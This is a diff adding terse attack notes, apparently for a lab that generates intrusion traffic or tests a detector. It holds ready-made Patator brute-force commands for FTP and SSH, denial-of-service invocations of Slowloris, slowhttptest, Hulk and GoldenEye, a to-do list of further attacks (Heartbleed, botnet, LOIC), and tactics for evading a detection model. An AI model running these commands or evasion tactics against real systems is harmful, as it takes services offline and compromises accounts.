@@ -1,0 +1,43 @@
+Brute force FTP (tools: Patator)
+patator ftp_login host=<target_ip> user=FILE0 password=FILE1 0=<username_file> 1=<password_file>
+
+Brute force SSH (tools: Patator)
+patator ssh_login host=<target_ip> user=FILE0 password=FILE1 0=<username_file> 1=<password_file>
+
+DoS Slowloris
+slowloris -s 500 <target_ip>
+
+DoS slowhttptest
+slowhttptest -B -c 2000 -u http://<target_ip> (body)
+slowhttptest -R -c 500 -u http://<target_ip> (range)
+slowhttptest -X -c 500 -u http://<target_ip> (read)
+
+DoS Hulk
+sudo python2 hulk.py http://<target_ip>
+
+DoS Goldeneye
+goldeneye http://<target_ip>
+
+Yg belum:
+- Heartbleed (harus downgrade OpenSSH 1.0.1f
+- Web Attack (harus install DVWA)
+- Infiltration
+- Botnet (tools: Ares)
+- DDoS (tools: LOIC)
+- nmap (sS, sT, sF, sX, sN, sP, sV, sU, sO, sA, sW, sR, sL and B)
+
+1. Boil the frog
+- Varying RPS, -> increasing TCP, UDP (shorten the delay)
+  - Exponential Rate
+  - Constant increase
+  - Steps
+2. Smuggler
+- Attempt using SSH when requesting TCP
+- Attempt using SSH or even telnet when spamming ICMPs
+3. Carpet bombing
+- Use as many ports as possible, also can be combined by boil the frog
+4. Spoofing
+- Simulate DDoS
+5. Hide and seek
+- Spamming requests while attempting SSH
+91. Steal the model (difficult) 
